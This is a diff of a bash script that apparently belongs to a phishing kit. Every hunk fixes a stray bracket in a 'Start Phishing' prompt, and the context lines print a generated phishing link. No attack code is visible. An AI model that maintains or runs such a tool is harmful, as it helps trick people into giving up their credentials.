@@ -164,7 +164,7 @@ ash() {
 			    printf "\e[91m[\e[92m*\e[91m]\e[93m Your URL >>\e[0m\e[92m %s\e[0m\n" $link
 			    echo                                                                                                                        
 			    ash 
-			    read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m[(Ctrl+c) :\e[m ' listner
+			    read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			    clear
 			    echo 
 			    echo
@@ -197,7 +197,7 @@ ash() {
                            printf "\e[91m[\e[32m*\e[91m]\e[93m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link
                            echo ""
 		           ash
-			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m[(Ctrl+c) :\e[m ' listner
+			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   echo 
 			   echo
@@ -230,7 +230,7 @@ ash() {
 			   printf "\e[91m[\e[92m*\e[91m]\e[93m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link
 			   echo "" 
 			   ash
-			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m[(Ctrl+c) :\e[m ' listner
+			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   echo 
 			   echo
@@ -263,7 +263,7 @@ ash() {
 			  printf "\e[91m[\e[92m*\e[91m]\e[93m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link  
 			  echo ""  
 			  ash 
-			  read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m[(Ctrl+c) :\e[m ' listner
+			  read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			  clear
 			  echo 
 			  echo
@@ -296,7 +296,7 @@ ash() {
 		          printf "\e[91m[\e[92m*\e[91m]\e[93m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link
 		          echo "" 
 		          ash
-			  read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m[(Ctrl+c) :\e[m ' listner
+			  read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			  clear
 			  echo 
 			  echo
@@ -329,7 +329,7 @@ ash() {
 		          printf "\e[91m[\e[92m*\e[91m]\e[93m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link
 		          echo "" 
 		          ash
-			  read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m[(Ctrl+c) :\e[m ' listner
+			  read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			  clear
 			  echo 
 			  echo
@@ -371,7 +371,7 @@ ash() {
                                 printf "\e[91m[\e[92m*\e[91m]\e[93m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link
                                 echo ""
 			        ash
-				read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m[(Ctrl+c) :\e[m ' listner
+				read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			        clear
 			        echo 
 			        echo
@@ -401,7 +401,7 @@ ash() {
                                 printf "\e[91m[\e[92m*\e[91m]\e[93m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link
                                 echo ""
 			        ash
-				read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m[(Ctrl+c) :\e[m ' listner
+				read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			        clear
 			        echo 
 			        echo
@@ -436,7 +436,7 @@ ash() {
                           printf "\e[91m[\e[92m*\e[91m]\e[33m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link
                           echo ""
 		          ash
-			  read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m[(Ctrl+c) :\e[m ' listner
+			  read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			  clear
 			  echo 
 			  echo
@@ -469,7 +469,7 @@ ash() {
                            printf "\e[91m[\e[92m*\e[91m]\e[93m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link
                            echo ""
 		           ash
-			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m[(Ctrl+c) :\e[m ' listner
+			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   echo 
 			   echo
@@ -502,7 +502,7 @@ ash() {
                            printf "\e[91m[\e[92m*\e[91m]\e[93m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link
                            echo 
 		           ash
-			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m[(Ctrl+c) :\e[m ' listner
+			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   echo 
 			   echo
@@ -535,7 +535,7 @@ ash() {
                            printf "\e[91m[\e[92m*\e[91m]\e[93m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link
                            echo ""
 		           ash
-			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m[(Ctrl+c) :\e[m ' listner
+			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   echo 
 			   echo
@@ -568,7 +568,7 @@ ash() {
                            printf "\e[91m[\e[92m*\e[31m]\e[93m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link
                            echo ""
 		           ash
-			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m[(Ctrl+c) :\e[m ' listner
+			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   echo 
 			   echo
@@ -634,7 +634,7 @@ ash() {
                            printf "\e[91m[\e[92m*\e[91m]\e[93m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link
                            echo ""
 		           ash 
-			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m[(Ctrl+c) :\e[m ' listner
+			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   echo 
 			   echo
@@ -667,7 +667,7 @@ ash() {
                            printf "\e[91m[\e[92m*\e[91m]\e[93m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link
                            echo 
 	                   ash
-			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m[(Ctrl+c) :\e[m ' listner
+			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   echo 
 			   echo
@@ -700,7 +700,7 @@ ash() {
                            printf "\e[91m[\e[92m*\e[91m]\e[93m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link
                            echo ""
              		   ash
-			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m[(Ctrl+c) :\e[m ' listner
+			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   echo 
 			   echo
@@ -733,7 +733,7 @@ ash() {
                            printf "\e[91m[\e[92m*\e[91m]\e[93m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link
                            echo ""
 	                   ash
-			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m[(Ctrl+c) :\e[m ' listner
+			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   echo 
 			   echo
@@ -766,7 +766,7 @@ ash() {
                            printf "\e[91m[\e[92m*\e[91m]\e[93m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link
                            echo ""
           		   ash
-			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m[(Ctrl+c) :\e[m ' listner
+			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   echo 
 			   echo
@@ -799,7 +799,7 @@ ash() {
                            printf "\e[91m[\e[92m*\e[91m]\e[93m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link
                            echo ""
 	                   ash
-			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m[(Ctrl+c) :\e[m ' listner
+			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   echo 
 			   echo
@@ -832,7 +832,7 @@ ash() {
                            printf "\e[91m[\e[92m*\e[91m]\e[93m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link
                            echo ""
 		           ash
-			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m[(Ctrl+c) :\e[m ' listner
+			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   echo 
 			   echo
@@ -865,7 +865,7 @@ ash() {
                            printf "\e[91m[\e[92m*\e[91m]\e[93m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link
                            echo ""
 	 	           ash
-			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m[(Ctrl+c) :\e[m ' listner
+			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   echo 
 			   echo
@@ -898,7 +898,7 @@ ash() {
                           printf "\e[91m[\e[92m*\e[91m]\e[93m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link
                           echo ""
 		          ash
-			  read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m[(Ctrl+c) :\e[m ' listner
+			  read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			  clear
 			  echo 
 			  echo
@@ -931,7 +931,7 @@ ash() {
                           printf "\e[91m[\e[92m*\e[91m]\e[93m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link
                           echo ""
 		          ash
-			  read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m[(Ctrl+c) :\e[m ' listner
+			  read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			  clear
 			  echo 
 			  echo
@@ -964,7 +964,7 @@ ash() {
                            printf "\e[91m[\e[92m*\e[91m]\e[33m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link
                            echo ""
 		           ash
-			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m[(Ctrl+c) :\e[m ' listner
+			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   echo 
 			   echo
@@ -997,7 +997,7 @@ ash() {
                            printf "\e[91m[\e[92m*\e[91m]\e[93m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link
                            echo ""
 	              	   ash
-			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m[(Ctrl+c) :\e[m ' listner
+			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   echo 
 			   echo
@@ -1030,7 +1030,7 @@ ash() {
                            printf "\e[91m[\e[92m*\e[91m]\e[93m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link
                            echo ""
 		           ash
-			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m[(Ctrl+c) :\e[m ' listner
+			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   echo 
 			   echo
@@ -1063,7 +1063,7 @@ ash() {
                            printf "\e[91m[\e[92m*\e[91m]\e[93m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link
                            echo ""
 		           ash
-			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m[(Ctrl+c) :\e[m ' listner
+			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   echo 
 			   echo
@@ -1096,7 +1096,7 @@ ash() {
                            printf "\e[91m[\e[92m*\e[91m]\e[93m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link
                            echo ""
  		           ash
-			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m[(Ctrl+c) :\e[m ' listner
+			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   echo 
 			   echo
@@ -1129,7 +1129,7 @@ ash() {
                            printf "\e[91m[\e[92m*\e[91m]\e[93m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link
                            echo ""
 		           ash
-			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m[(Ctrl+c) :\e[m ' listner
+			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   echo 
 			   echo
@@ -1162,7 +1162,7 @@ ash() {
                            printf "\e[91m[\e[92m*\e[91m]\e[93m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link
                            echo ""
 		           ash
-			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m[(Ctrl+c) :\e[m ' listner
+			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   echo 
 			   echo
@@ -1195,7 +1195,7 @@ ash() {
                            printf "\e[91m[\e[92m*\e[91m]\e[93m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link
                            echo ""
 		           ash
-			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m[(Ctrl+c) :\e[m ' listner
+			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   echo 
 			   echo
